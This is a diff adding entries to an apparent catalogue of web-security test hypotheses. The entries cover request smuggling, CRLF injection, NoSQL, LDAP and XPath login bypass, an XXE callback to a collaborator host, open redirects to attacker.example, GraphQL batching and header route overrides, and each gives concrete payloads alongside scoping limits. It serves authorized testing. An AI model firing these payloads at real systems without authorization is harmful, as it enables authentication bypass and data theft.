+  - All alternate paths blocked or inert
+  - Parser rejects nested constructor keys entirely
+  false_positive_rules:
+  - Confirm the oracle change is caused by the bypass attempt, with a clean baseline between attempts
+  - Do not pollute shared/global state beyond a harmless marker
+  followup_experiment: Proceed to gadget hunting once any path pollutes.
+  regression_test: __proto__ literal remains blocked; bypass path behavior is stable.
+  difficulty_estimate: 3
+- id: C1-016
+  name: CL.TE / TE.CL desync detection via timing differential
+  klass: web
+  requires:
+  - http11_frontend_backend_stack
+  signals:
+  - reverse_proxy_or_cdn_in_front
+  - backend_speaks_http11
+  questions:
+  - Do front-end and back-end disagree on where the request body ends?
+  - Does the back-end wait for bytes the front-end already consumed (or vice versa)?
+  evidence:
+    positive:
+    - Delay reproduced >=3 times on the probe and absent on the control.
+    - Repeatable response delay on the desync probe versus a clean control request
+    negative:
+    - No timing delta across runs
+    - Stack rejects ambiguous requests outright (400)
+  followups:
+  - C1-017
+  - C1-019
+  test: 'Send the classic timing probes on a single connection: CL.TE — POST with both Content-Length: 4 and Transfer-Encoding:
+    chunked and a short chunked body; if the front-end honors CL and the back-end honors TE, the back-end waits and the response
+    is delayed. TE.CL — swap the lengths (CL: 6) so the back-end waits for CL bytes. Run each at least 3 times plus clean
+    controls; only a repeatable delta counts.'
+  impact_hint: 'Request smuggling: cache poisoning, credential capture, front-end control bypass.'
+  preconditions:
+  - HTTP/1.1 hop between front-end and back-end
+  - Scope permits desync probing (timing only, no poisoning)
+  required_state: unauthenticated
+  hypothesis_generator: Ambiguous framing (both CL and TE present) is resolved differently per hop; the disagreement shows
+    as a timing delta.
+  request_strategy: Timing probes only; never poison shared state; disable connection reuse when validating.
+  mutation_strategy: Try CL.TE then TE.CL; adjust lengths if the stack normalizes one header.
+  expected_signal: Consistent delay (seconds) on desync probes, fast responses on controls.
+  positive_oracle: Delay reproduced >=3 times on the probe and absent on the control.
+  negative_evidence:
+  - No timing delta across runs
+  - Stack rejects ambiguous requests outright (400)
+  false_positive_rules:
+  - A single slow response is noise — require repeats and controls
+  - Disable pipelining/keep-alive reuse during validation; connection reuse alone can fake desync
+  followup_experiment: If desync confirmed, validate with a self-poison (your own follow-up request) before any impact claim;
+    then try TE obfuscation (C1-017).
+  regression_test: Clean control requests stay fast; probe timing delta persists.
+  difficulty_estimate: 4
+- id: C1-017
+  name: Transfer-Encoding obfuscation ladder for smuggling
+  klass: web
+  requires:
+  - desync_probe_baseline
+  signals:
+  - one_hop_normalizes_te_differently
+  - te_variants_accepted_inconsistently
+  questions:
+  - Which TE spellings does the front-end ignore that the back-end honors (or vice versa)?
+  - Can a folded or spaced header smuggle TE past the front-end?
+  evidence:
+    positive:
+    - Repeatable delay on the obfuscated probe, fast control.
+    - A TE variant produces the desync timing signal while the canonical spelling does not
+    negative:
+    - All variants rejected or normalized identically
+    - No delta on any variant
+  followups:
+  - C1-016
+  test: 'Replay the C1-016 timing probe while mutating only the Transfer-Encoding header: ''Transfer-Encoding: xchunked'',
+    ''Transfer-Encoding : chunked'' (space before colon), tab after colon, '' Transfer-Encoding: chunked'' (leading space),
+    folded header ''X: x[\n]Transfer-Encoding: chunked'', and duplicate TE headers. The variant that one hop ignores and the
+    other honors is the desync primitive.'
+  impact_hint: Turns a hardened stack into a smuggling primitive; same impact as C1-016.
+  preconditions:
+  - Baseline desync behavior characterized (or suspected)
+  required_state: unauthenticated
+  hypothesis_generator: Header parsing differs per hop; an obfuscated TE is normalized by one hop and ignored by the other,
+    recreating the CL/TE disagreement.
+  request_strategy: One variant per probe; timing-only; low rate.
+  mutation_strategy: Walk the obfuscation list in order; keep body framing identical.
+  expected_signal: Timing delta appears for exactly the obfuscated variant.
+  positive_oracle: Repeatable delay on the obfuscated probe, fast control.
+  negative_evidence:
+  - All variants rejected or normalized identically
+  - No delta on any variant
+  false_positive_rules:
+  - 'Same timing discipline as C1-016: repeats, controls, no reuse'
+  - A 400 on a variant means that hop rejects it — not a desync
+  followup_experiment: Use the winning variant for a self-poison validation.
+  regression_test: Canonical TE probe behavior unchanged.
+  difficulty_estimate: 4
+- id: C1-018
+  name: CL.0 desync detection (back-end ignores request body)
+  klass: web
+  requires:
+  - http11_frontend_backend_stack
+  signals:
+  - backend_treats_post_like_get
+  - second_request_gets_first_requests_path
+  questions:
+  - Does the back-end act as if every request has no body regardless of Content-Length?
+  - Can a leftover body become the next request's request line?
+  evidence:
+    positive:
+    - 404 (or distinct response) for the unique smuggled path on the follow-up request.
+    - A follow-up request receives the response for the smuggled path (e.g., 404 for /smuggled-path)
+    negative:
+    - Follow-up returns its own normal response
+    - Front-end closes the connection after the first request
+  followups:
+  - C1-016
+  test: 'Send POST / with Content-Length pointing at a body that contains a complete second request line to a nonexistent
+    path (e.g., GET /no-such-path-xyz HTTP/1.1). Then send a normal follow-up request on the same connection: if the follow-up
+    gets the 404 for the smuggled path, the back-end ignored the body and treated it as a new request — CL.0 confirmed.'
+  impact_hint: Request smuggling without any TE header; bypasses TE-focused defenses.
+  preconditions:
+  - HTTP/1.1 front/back stack; scope permits desync probing
+  required_state: unauthenticated
+  hypothesis_generator: If the back-end ignores Content-Length, the smuggled bytes in the body are parsed as the next request
+    on the reused connection.
+  request_strategy: Paired requests on one connection; unique smuggled path per attempt.
+  mutation_strategy: 'Vary the smuggled path; try with and without Connection: keep-alive.'
+  expected_signal: Follow-up response corresponds to the smuggled path, not the requested one.
+  positive_oracle: 404 (or distinct response) for the unique smuggled path on the follow-up request.
+  negative_evidence:
+  - Follow-up returns its own normal response
+  - Front-end closes the connection after the first request
+  false_positive_rules:
+  - Use a unique path per attempt to avoid cache/route confusion
+  - Confirm on a fresh connection pair before claiming
+  followup_experiment: Test whether the front-end can be made to keep the connection alive for repeated smuggling.
+  regression_test: Normal POST-then-GET on one connection behaves sanely.
+  difficulty_estimate: 4
+- id: C1-019
+  name: 'Hop-by-hop header stripping to force desync (Connection: ...)'
+  klass: web
+  requires:
+  - proxy_in_path
+  signals:
+  - proxy_strips_hop_by_hop_headers
+  - desync_suspected_but_te_normalized
+  questions:
+  - Does the proxy delete headers named in the Connection header?
+  - Can naming Content-Length or Transfer-Encoding there desync the next hop?
+  evidence:
+    positive:
+    - Repeatable delta tied to the Connection value, absent in controls.
+    - Timing/behavior delta when Connection names the framing header versus a clean request
+    negative:
+    - Proxy forwards all headers untouched
+    - No delta for any Connection value
+  followups:
+  - C1-016
+  - C1-017
+  test: 'Send a request with ''Connection: Content-Length'' (or ''Connection: Transfer-Encoding'') plus the named framing
+    header. A proxy that honors hop-by-hop semantics strips the named header before forwarding, so the back-end sees a different
+    framing than the client sent — manufacturing a CL.TE/TE.CL disagreement even when both headers were well-formed.'
+  impact_hint: Creates smuggling on stacks that normalize TE correctly.
+  preconditions:
+  - A proxy/hop in path that processes Connection as hop-by-hop
+  required_state: unauthenticated
+  hypothesis_generator: RFC hop-by-hop handling removes the named header at the proxy, so front and back disagree on framing
+    without any obfuscation.
+  request_strategy: Single probes with timing observation; low rate.
+  mutation_strategy: Name CL, then TE, then both; observe which produces the delta.
+  expected_signal: Desync timing signal appears only when the Connection header names a framing header.
+  positive_oracle: Repeatable delta tied to the Connection value, absent in controls.
+  negative_evidence:
+  - Proxy forwards all headers untouched
+  - No delta for any Connection value
+  false_positive_rules:
+  - Verify the proxy actually stripped the header (reflect via a debug/echo endpoint if available) before claiming desync
+  - Timing discipline from C1-016 applies
+  followup_experiment: Combine with TE obfuscation (C1-017) if partial stripping occurs.
+  regression_test: Requests without the Connection trick behave normally.
+  difficulty_estimate: 5
+- id: C1-020
+  name: CRLF filter bypass via Unicode homoglyph encodings
+  klass: injection
+  requires:
+  - header_or_log_injection_surface
+  signals:
+  - literal_crlf_stripped
+  - percent_encoded_crlf_blocked
+  questions:
+  - Does the filter strip \r\n after decoding only one encoding layer?
+  - Does a Unicode normalization step turn lookalike sequences into real CRLF?
+  evidence:
+    positive:
+    - 'Response contains the exact injected header line (e.g., Set-Cookie: <marker>).'
+    - Injected Set-Cookie or header appears in the response via the encoded sequence
+    negative:
+    - All encodings stripped or rendered inert
+    - Framework rejects CR/LF at the header-setting API itself
+  followups:
+  - C1-016
+  test: 'Where %0D%0A is stripped, try the UTF-8 overlong-style sequences %E5%98%8A (LF) and %E5%98%8D (CR), which some stacks
+    normalize to real CR/LF after the filter runs. Probe: /%E5%98%8A%E5%98%8DSet-Cookie:%20<pwn> and check the response headers
+    for the injected cookie. Also try double-encoding (%250D%250A) for filters that decode once before checking.'
+  impact_hint: Response splitting, header injection, log injection; chained to XSS or cache poisoning.
+  preconditions:
+  - User input lands in a response header, redirect target, or log line
+  required_state: unauthenticated
+  hypothesis_generator: Filters that strip literal CR/LF or single-decoded %0D%0A miss alternate Unicode encodings that a
+    later normalization step converts back to CR/LF.
+  request_strategy: One encoding per probe; inspect raw response headers.
+  mutation_strategy: Cycle %E5%98%8A/%E5%98%8D, double-encoding, and mixed case.
+  expected_signal: Injected header/cookie present in the raw response.
+  positive_oracle: 'Response contains the exact injected header line (e.g., Set-Cookie: <marker>).'
+  negative_evidence:
+  - All encodings stripped or rendered inert
+  - Framework rejects CR/LF at the header-setting API itself
+  false_positive_rules:
+  - The injected value must appear as a real header, not reflected in the body
+  - Use a harmless marker value, never a real session cookie name
+  followup_experiment: If header injection works, test response-splitting into a second response and log-injection shaping.
+  regression_test: Literal %0D%0A stays blocked; bypass encoding behavior is stable.
+  difficulty_estimate: 3
+- id: C1-021
+  name: NoSQL operator injection for authentication bypass
+  klass: injection
+  requires:
+  - login_or_query_endpoint
+  signals:
+  - mongodb_or_nosql_backend
+  - json_body_accepted_for_credentials
+  questions:
+  - Are the credentials passed as a JSON object straight into a find() query?
+  - Do query operators ($ne, $gt, $regex) survive into the query?
+  evidence:
+    positive:
+    - Session/token issued for the test account with a wrong password.
+    - 'Login succeeds with {"password": {"$ne": ""}} or {"$gt": ""} without the real password'
+    negative:
+    - Operators rejected or treated as literal strings
+    - Input cast to string before querying
+  followups:
+  - C1-022
+  - C1-023
+  test: 'POST the login with operator objects instead of strings: {"username": "admin", "password": {"$ne": ""}} and {"username":
+    {"$gt": ""}, "password": {"$gt": ""}}. If the backend builds {user: <input>, pass: <input>} directly, $ne/$gt make the
+    password clause always true. Confirm by logging in as a known user without its password, using your own test account.'
+  impact_hint: Authentication bypass; with $regex, blind data extraction.
+  preconditions:
+  - JSON request body; NoSQL/ODM query built from raw input
+  required_state: unauthenticated
+  hypothesis_generator: If user input becomes a Mongo-style query document unmodified, operator keys change the query's logic
+    instead of being compared as strings.
+  request_strategy: A few operator payloads against your own test account.
+  mutation_strategy: Try $ne, $gt, $regex, $in; try operators in username vs password separately.
+  expected_signal: Successful authentication without the correct password.
+  positive_oracle: Session/token issued for the test account with a wrong password.
+  negative_evidence:
+  - Operators rejected or treated as literal strings
+  - Input cast to string before querying
+  false_positive_rules:
+  - Only test against accounts you own
+  - A 200 with an error body is not a login — require a real session/token
+  followup_experiment: If bypass works, test blind $regex extraction on non-sensitive fields of your own account.
+  regression_test: Correct-password login still works; operator login stays working/fixed consistently.
+  difficulty_estimate: 2
+- id: C1-022
+  name: LDAP filter injection for authentication bypass
+  klass: injection
+  requires:
+  - ldap_backed_login_or_search
+  signals:
+  - active_directory_or_openldap_backend
+  - wildcard_search_behavior
+  questions:
+  - Is user input concatenated into an LDAP filter string?
+  - Can injected parentheses and wildcards restructure the filter logic?
+  evidence:
+    positive:
+    - Bind/session succeeds for a chosen test user without its credential.
+    - Login succeeds with a filter-breaking username and any password
+    negative:
+    - All metacharacter input rejected or escaped
+    - Parameterized LDAP API in use
+  followups:
+  - C1-021
+  - C1-023
+  test: Against a login of the form (&(uid=$user)(userPassword=$pass)), submit username *)(uid=*))(|(uid=* — the injected
+    close-paren, wildcard, and OR restructure the filter so it matches the first directory entry regardless of password. Use
+    only test accounts; a successful bind as the test user without its password confirms the injection.
+  impact_hint: Authentication bypass; with blind techniques, directory enumeration.
+  preconditions:
+  - LDAP search filter built by string concatenation
+  required_state: unauthenticated
+  hypothesis_generator: Unescaped LDAP metacharacters (*, (, ), \) let the attacker rewrite the filter's boolean structure.
+  request_strategy: A couple of filter-restructuring payloads against test accounts.
+  mutation_strategy: Vary the injection to fit AND vs OR filter shapes.
+  expected_signal: Authenticated session for the test account with wrong password.
+  positive_oracle: Bind/session succeeds for a chosen test user without its credential.
+  negative_evidence:
+  - All metacharacter input rejected or escaped
+  - Parameterized LDAP API in use
+  false_positive_rules:
+  - Test accounts only; never attempt against real user entries
+  - Confirm the bypass is filter logic, not a default-credential coincidence
+  followup_experiment: Test blind wildcard enumeration (*admin*) only against test organizational units.
+  regression_test: Normal login with correct credentials unaffected.
+  difficulty_estimate: 3
+- id: C1-023
+  name: XPath injection for authentication bypass
+  klass: injection
+  requires:
+  - xml_backed_login_or_query
+  signals:
+  - xml_datastore
+  - quote_sensitive_errors
+  questions:
+  - Is user input interpolated into an XPath expression?
+  - Does ' or '1'='1 break out of the string comparison?
+  evidence:
+    positive:
+    - Session established for the test account with wrong password.
+    - Login succeeds with admin' or '1'='1 and any password
+    negative:
+    - Quotes escaped or parameterized XPath in use
+    - Login fails for all injection attempts
+  followups:
+  - C1-021
+  - C1-022
+  test: For a query like //user[username/text()='$u' and password/text()='$p'], submit username admin' or '1'='1 and any password.
+    The injected quote and OR make the predicate always true, returning the first user node (typically admin). Confirm by
+    authenticating as your own test user without its password.
+  impact_hint: Authentication bypass; XPath 2.0 functions can extend to blind extraction.
+  preconditions:
+  - XPath query built by string interpolation over an XML store
+  required_state: unauthenticated
+  hypothesis_generator: Unescaped quotes let the attacker break out of the XPath string literal and inject boolean logic.
+  request_strategy: A few quote-break payloads against test accounts.
+  mutation_strategy: Try ' or '1'='1, " or "1"="1, and comment/close variants for different quote styles.
+  expected_signal: Login succeeds without the correct password.
+  positive_oracle: Session established for the test account with wrong password.
+  negative_evidence:
+  - Quotes escaped or parameterized XPath in use
+  - Login fails for all injection attempts
+  false_positive_rules:
+  - Test accounts only
+  - Require an actual authenticated session, not an error-shaped 200
+  followup_experiment: If bypass works, assess blind extraction risk via boolean-based XPath (authorized scope only).
+  regression_test: Legitimate login still functions.
+  difficulty_estimate: 2
+- id: C1-024
+  name: XSLT injection via stylesheet upload (SVG/XML)
+  klass: injection
+  requires:
+  - xml_or_svg_upload
+  signals:
+  - xslt_processor_server_side
+  - stylesheet_reference_honored
+  questions:
+  - Does the server apply an XSLT transform to uploaded XML/SVG?
+  - Is the transform's stylesheet attacker-influenced?
+  evidence:
+    positive:
+    - system-property output (or equivalent) in the server-processed result.
+    - xsl:value-of or extension functions execute during processing (output or timing/OOB)
+    negative:
+    - Upload stored without transformation
+    - Stylesheet directives stripped or ignored
+  followups:
+  - C1-013
+  test: Upload an XML/SVG referencing an inline stylesheet that uses benign XSLT constructs (e.g., <xsl:value-of select="system-property('xsl:version')"/>)
+    and observe whether the version string appears in the processed output. This confirms server-side XSLT execution; stop
+    there on a live target — extension-function RCE is lab-only.
+  impact_hint: Server-side XSLT can reach file read and, with extension functions, code execution.
+  preconditions:
+  - File upload or XML import that the server transforms
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: If the server runs an XSLT processor over attacker XML, stylesheet directives execute server-side.
+  request_strategy: One benign stylesheet probe; inspect processed output.
+  mutation_strategy: Try xml-stylesheet processing instruction vs embedded xsl:stylesheet.
+  expected_signal: Processor version string or transformed output reflecting the stylesheet.
+  positive_oracle: system-property output (or equivalent) in the server-processed result.
+  negative_evidence:
+  - Upload stored without transformation
+  - Stylesheet directives stripped or ignored
+  false_positive_rules:
+  - Client-side rendering of the SVG is not server-side XSLT — the output must come from the server's processing pipeline
+  - Never invoke extension functions (file read, execute) on a live target
+  followup_experiment: In an authorized lab, test whether document() or extension functions are enabled.
+  regression_test: Plain XML/SVG without stylesheet processes as before.
+  difficulty_estimate: 3
+- id: C1-025
+  name: GraphQL nested-argument injection (SQLi/NoSQL inside filter args)
+  klass: graphql
+  requires:
+  - graphql_endpoint
+  signals:
+  - filter_or_where_arguments
+  - backend_orm_or_raw_query
+  questions:
+  - Are GraphQL filter arguments concatenated into SQL or NoSQL queries?
+  - Do the typed schema's string args reach a raw query layer?
+  evidence:
+    positive:
+    - DBMS error string or a boolean differential reproducible across runs.
+    - DBMS error or boolean/timing differential on a filter argument
+    negative:
+    - Arguments safely parameterized; no differential
+    - Filter args validated against an allowlist
+  followups:
+  - C1-021
+  test: 'For a query like { users(filter: "<input>") { id } }, inject SQL/NoSQL metacharacters into the filter argument: users(filter:
+    "admin''--"), users(filter: "{$gt: ''''}"). Compare error messages, result counts, and timing against a benign filter.
+    A differential indicates the argument reaches a query layer unsanitized.'
+  impact_hint: Data extraction or auth bypass through the GraphQL layer.
+  preconditions:
+  - GraphQL endpoint with string filter/search arguments
+  required_state: authenticated_if_required
+  hypothesis_generator: GraphQL's type system does not sanitize; if resolvers interpolate args into queries, classic injection
+    applies inside the typed API.
+  request_strategy: A few metacharacter probes per filter argument; compare against baseline.
+  mutation_strategy: Cycle SQLi, NoSQL operator, and quote-break shapes.
+  expected_signal: Error text, row-count change, or timing delta tied to the metacharacters.
+  positive_oracle: DBMS error string or a boolean differential reproducible across runs.
+  negative_evidence:
+  - Arguments safely parameterized; no differential
+  - Filter args validated against an allowlist
+  false_positive_rules:
+  - GraphQL validation errors are not injection — require a backend-shaped signal
+  - Do not extract data beyond proving the differential
+  followup_experiment: If a differential exists, characterize boolean vs error-based to scope impact.
+  regression_test: Benign filter returns the normal result set.
+  difficulty_estimate: 3
+- id: C1-026
+  name: GraphQL JSON array batching to bypass single-query rate limits
+  klass: graphql
+  requires:
+  - graphql_endpoint
+  signals:
+  - rate_limit_on_login_or_otp_field
+  - batching_not_documented
+  questions:
+  - Does the endpoint accept a JSON array of queries as one HTTP request?
+  - Is the rate limit applied per HTTP request rather than per GraphQL operation?
+  evidence:
+    positive:
+    - 10 batched attempts succeed where 10 sequential singles are throttled.
+    - N operations in one array all execute while N sequential requests are throttled
+    negative:
+    - Array batching rejected or each operation still counted
+    - Batch size capped at 1
+  followups:
+  - C1-008
+  test: 'Send the login/OTP-guess operation as a JSON array of 10 aliased copies in a single POST ([{query: ...}, ...]). If
+    all 10 execute (check per-operation responses) while 10 sequential single requests hit the rate limit, the limit counts
+    HTTP requests, not operations — batching multiplies the effective attempt rate.'
+  impact_hint: Credential stuffing / OTP brute-force at N× the intended rate.
+  preconditions:
+  - GraphQL endpoint with a rate-limited sensitive operation
+  required_state: unauthenticated
+  hypothesis_generator: Array batching packs many operations into one HTTP request; naive rate limiters count the request
+    once.
+  request_strategy: Small batches (10) against your own test account; never brute-force real users.
+  mutation_strategy: Vary batch size; try aliases vs array batching.
+  expected_signal: Batched operations all return operation-level responses without throttle errors.
+  positive_oracle: 10 batched attempts succeed where 10 sequential singles are throttled.
+  negative_evidence:
+  - Array batching rejected or each operation still counted
+  - Batch size capped at 1
+  false_positive_rules:
+  - Only test with your own account's credentials/OTP space
+  - A successful batch is the finding; do not run real brute-force campaigns
+  followup_experiment: Check whether persisted-query or GET-based queries offer the same multiplication.
+  regression_test: Single requests still rate-limited as before.
+  difficulty_estimate: 3
+- id: C1-027
+  name: GraphQL deep/circular nesting to evade depth limits (resource exhaustion)
+  klass: graphql
+  requires:
+  - graphql_endpoint
+  signals:
+  - self_referential_types
+  - no_or_weak_query_complexity_limit
+  questions:
+  - Do interfaces, fragments, or aliases let a query exceed the advertised depth limit?
+  - Is cost calculated on the query string rather than the expanded execution plan?
+  evidence:
+    positive:
+    - Execution success plus latency far above the shallow control, reproducible.
+    - Deeply nested query executes despite a depth limit, with high response time
+    negative:
+    - Depth/complexity limit rejects all deep shapes
+    - Query cost analysis blocks expansion regardless of spelling
+  followups:
+  - C1-026
+  test: Build a nested query through a self-referential field (user { friends { friends { ... } } }) and, if a depth limit
+    blocks it, re-express the nesting with fragments and aliases or via interface types that the depth counter measures differently.
+    Measure response time versus a shallow control; a large, repeatable slowdown with successful execution indicates weak
+    complexity analysis.
+  impact_hint: Denial of service via expensive queries; often out of scope — check program rules first.
+  preconditions:
+  - GraphQL schema with recursive relationships; DoS testing in scope
+  required_state: authenticated_if_required
+  hypothesis_generator: Depth/complexity guards that count syntax instead of execution cost can be evaded with fragments and
+    aliases, allowing exponential field expansion.
+  request_strategy: Modest depths first; stop at clear signal — never attempt actual DoS.
+  mutation_strategy: Fragments, aliases, and interface spreads as alternative nesting spellings.
+  expected_signal: Nested query executes (not rejected) with disproportionate latency.
+  positive_oracle: Execution success plus latency far above the shallow control, reproducible.
+  negative_evidence:
+  - Depth/complexity limit rejects all deep shapes
+  - Query cost analysis blocks expansion regardless of spelling
+  false_positive_rules:
+  - DoS findings need program permission; otherwise report as missing complexity controls with the timing evidence
+  - One slow query is noise — require repeats and a control
+  followup_experiment: If evasion works, test whether persisted queries bypass the analysis entirely.
+  regression_test: Shallow queries unaffected; deep shape behavior stable.
+  difficulty_estimate: 4
+- id: C1-028
+  name: Open-redirect fragment smuggling past path-only validators
+  klass: web
+  requires:
+  - redirect_parameter
+  signals:
+  - validator_inspects_path_only
+  - redirect_built_from_raw_input
+  questions:
+  - Does the validator parse the URL and check only .Path, ignoring .Fragment?
+  - Is the Location header built from the original unsanitized string?
+  evidence:
+    positive:
+    - 302 Location resolves to the attacker-controlled host.
+    - '302 Location points at the attacker host smuggled after #'
+    negative:
+    - Fragment stripped from the emitted Location
+    - Validator rejects or normalizes the whole input
+  followups:
+  - C1-008
+  - C1-029
+  test: 'Submit redirectTo=/%23/../attacker.example/ (i.e., path ''/'' with fragment ''/..//attacker.example/''): a validator
+    that checks only the parsed path sees ''/'' and approves, but if the response Location is built from the raw string, the
+    fragment survives and the browser follows it to the attacker host. Verify the actual 302 Location value.'
+  impact_hint: Open redirect; chained into OAuth code theft or phishing.
+  preconditions:
+  - Redirect target taken from user input with a parse-then-check validator
+  required_state: unauthenticated
+  hypothesis_generator: Parsing discards the fragment for validation, but emitting the raw string reintroduces it into the
+    redirect — a check/emit mismatch.
+  request_strategy: A few fragment-smuggling shapes; read raw 302 Location headers.
+  mutation_strategy: 'Vary fragment content (//attacker, /\attacker, encoded # as %23 vs literal).'
+  expected_signal: Location header contains the attacker host.
+  positive_oracle: 302 Location resolves to the attacker-controlled host.
+  negative_evidence:
+  - Fragment stripped from the emitted Location
+  - Validator rejects or normalizes the whole input
+  false_positive_rules:
+  - The Location header is the oracle — not the request URL echo
+  - Confirm the browser actually follows it (some clients drop fragments on redirect)
+  followup_experiment: Chain the redirect into an OAuth redirect_uri bypass (C1-008).
+  regression_test: Legitimate relative redirects still work.
+  difficulty_estimate: 3
+- id: C1-029
+  name: DOM open redirect via validate-decoded / emit-original mismatch
+  klass: web
+  requires:
+  - spa_redirect_helper
+  signals:
+  - client_side_redirect_from_param
+  - double_encoding_accepted
+  questions:
+  - Does the SPA decode the path for validation but navigate to the original string?
+  - Do encoded ../ segments survive validation and decode later in the browser?
+  evidence:
+    positive:
+    - Network log shows a request to the unintended route with your marker.
+    - Double-encoded traversal navigates the SPA to an unintended route/gadget
+    negative:
+    - Validator normalizes before both check and use
+    - Traversal blocked at every encoding depth
+  followups:
+  - C1-028
+  test: Send a path like /dashboard/script/%253f%2f..%2f..%2fuser%2frotate%3fredirectTo%3d... where the validator decodes
+    once (seeing no '..') but the app later uses the original string, which the browser decodes a second time into a traversal.
+    Observe the final navigated URL or fetched resource — if it reaches the unintended endpoint, the decode/emit mismatch
+    is confirmed.
+  impact_hint: Client-side path traversal; chained with a redirect gadget it becomes XSS/account takeover.
+  preconditions:
+  - SPA redirect/loader helper that validates a decoded copy but acts on the raw string
+  required_state: unauthenticated
+  hypothesis_generator: Double decoding — once by the validator, once by the browser — lets encoded traversal survive the
+    check and execute on navigation.
+  request_strategy: A few double-encoded shapes; observe navigation/fetch targets.
+  mutation_strategy: Vary encoding depth (%2f vs %252f) and traversal depth.
+  expected_signal: App navigates to or fetches the traversed endpoint.
+  positive_oracle: Network log shows a request to the unintended route with your marker.
+  negative_evidence:
+  - Validator normalizes before both check and use
+  - Traversal blocked at every encoding depth
+  false_positive_rules:
+  - The fetched/navigated URL is the oracle, not the input echo
+  - Do not chain to actual script execution on a live target beyond the navigation proof
+  followup_experiment: If traversal reaches a redirect gadget, test the fragment-smuggling chain (C1-028).
+  regression_test: Normal SPA navigation unaffected.
+  difficulty_estimate: 4
+- id: C1-030
+  name: Mass assignment via nested objects and array role fields
+  klass: api
+  requires:
+  - json_update_or_register_endpoint
+  signals:
+  - extra_fields_silently_accepted
+  - orm_auto_binding
+  questions:
+  - 'Does the endpoint bind nested JSON (user: {role: ...}) or arrays (role_ids: [1,2])?'
+  - Is there a server-side allowlist of bindable fields?
+  evidence:
+    positive:
+    - Subsequent GET shows the injected privileged value on your test account.
+    - Injected role/isAdmin/balance field persists and is reflected in subsequent reads
+    negative:
+    - Extra fields ignored or rejected on all shapes
+    - Explicit allowlist in the binding code
+  followups:
+  - C1-014
+  test: 'On register/profile-update, add guarded fields at multiple shapes: flat ({"role": "admin", "isAdmin": true}), nested
+    ({"user": {"role": "admin"}}), and array ({"role_ids": [1]}). Then read the object back: if any guarded field persisted,
+    binding is not allowlisted. Use only your own test account.'
+  impact_hint: Privilege escalation, balance/price manipulation.
+  preconditions:
+  - JSON body bound to a model/ORM without an explicit field allowlist
+  required_state: authenticated_as_test_user
+  hypothesis_generator: Auto-binding frameworks assign every supplied key; nested and array shapes bypass flat blocklists.
+  request_strategy: One shape per request against your own account; read back each time.
+  mutation_strategy: Flat, nested, array, and case-variant field names.
+  expected_signal: Guarded field present in the read-back response.
+  positive_oracle: Subsequent GET shows the injected privileged value on your test account.
+  negative_evidence:
+  - Extra fields ignored or rejected on all shapes
+  - Explicit allowlist in the binding code
+  false_positive_rules:
+  - Persistence plus read-back is required — an echoed request body is not a finding
+  - Never escalate your own account beyond the test; revert after confirming
+  followup_experiment: Test whether the same shapes work on admin-only endpoints (BFLA).
+  regression_test: Normal update without extra fields behaves as before.
+  difficulty_estimate: 2
+- id: C1-031
+  name: Blind XXE exfiltration via out-of-band parameter entities
+  klass: injection
+  requires:
+  - xml_parsing_endpoint
+  - no_inline_entity_reflection
+  signals:
+  - external_dtd_fetched
+  - error_or_timing_on_doctype
+  questions:
+  - Are external parameter entities resolved even when inline entities are blocked?
+  - Does the parser make an outbound request for the external DTD?
+  evidence:
+    positive:
+    - Collaborator log shows the DTD fetch from the target's infrastructure.
+    - Collaborator receives a hit for the external DTD URL (blind XXE confirmed)
+    - File content exfiltrated via parameter-entity error or second request
+    negative:
+    - No outbound request; DOCTYPE rejected outright
+    - External entities fully disabled
+  followups:
+  - C1-024
+  test: Submit XML with a DOCTYPE declaring an external parameter entity pointing at your collaborator (<!ENTITY % xxe SYSTEM
+    "https://<collab>/xxe"> %xxe;). A collaborator hit proves the parser resolves external entities — blind XXE — without
+    needing inline reflection. Do not exfiltrate real files; the callback is the finding.
+  impact_hint: File disclosure, SSRF via the parser, and with expect:// wrappers, RCE on some stacks.
+  preconditions:
+  - Server-side XML parsing (uploads, SVG, DOCX/XLSX, SOAP, SAML)
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: Disabling inline entity expansion often leaves parameter-entity external resolution enabled; the outbound
+    DTD fetch is observable blind.
+  request_strategy: Single DTD probe with a unique collaborator URL.
+  mutation_strategy: Try SYSTEM then PUBLIC identifiers; try SVG wrapper if plain XML is rejected.
+  expected_signal: Outbound request to the collaborator URL.
+  positive_oracle: Collaborator log shows the DTD fetch from the target's infrastructure.
+  negative_evidence:
+  - No outbound request; DOCTYPE rejected outright
+  - External entities fully disabled
+  false_positive_rules:
+  - The callback must come from the target's parser, keyed to your unique URL
+  - Do not attempt file exfiltration on a live target — the fetch proof suffices
+  followup_experiment: If blind XXE confirmed, assess in an authorized lab whether error-based exfiltration is possible.
+  regression_test: Benign XML without DOCTYPE processes normally.
+  difficulty_estimate: 3
+- id: C1-032
+  name: 403/401 bypass via X-Original-URL / X-Rewrite-URL route override
+  klass: auth
+  requires:
+  - forbidden_admin_or_internal_path
+  signals:
+  - reverse_proxy_or_waf_in_front
+  - framework_honors_override_headers
+  questions:
+  - Does the back-end route on X-Original-URL while the front-end ACLs the visible path?
+  - Do verb or path mutations change the decision?
+  evidence:
+    positive:
+    - Response body contains content only an authorized admin view would render.
+    - 403 becomes 200 with protected content when the override header rewrites the path
+    negative:
+    - Override headers ignored; 403 persists on all variants
+    - 200 but body is the generic error page
+  followups:
+  - C1-009
+  test: 'Request a benign allowed path (/) with X-Original-URL: /admin (and variants X-Rewrite-URL, X-Forwarded-Path). If
+    the back-end honors the header for routing while the front-end ACL saw only ''/'', a 403 flips to 200 with admin content.
+    Baseline the 403 first, and require a protected-content marker — not just a status change — as proof.'
+  impact_hint: Authorization bypass to admin/internal functionality.
+  preconditions:
+  - Front-end ACL and back-end routing disagree on which value to trust
+  required_state: authenticated_low_privilege
+  hypothesis_generator: Some stacks route on override headers for rewrites; if the ACL checks the original path, the header
+    smuggles the real destination past it.
+  request_strategy: A few header variants against the known-403 path; compare bodies.
+  mutation_strategy: Cycle X-Original-URL, X-Rewrite-URL, X-Forwarded-Path; try with different verbs.
+  expected_signal: Status flips 403->200 and the body contains admin-only markers.
+  positive_oracle: Response body contains content only an authorized admin view would render.
+  negative_evidence:
+  - Override headers ignored; 403 persists on all variants
+  - 200 but body is the generic error page
+  false_positive_rules:
+  - Require the protected-content marker — soft-200 error pages are the classic false positive
+  - Diff against the authenticated-admin view if you have one; otherwise against the 403 baseline
+  followup_experiment: If routing honors the header, test path-traversal and verb-tampering combinations.
+  regression_test: Direct /admin request still 403s; benign path unaffected.
+  difficulty_estimate: 2
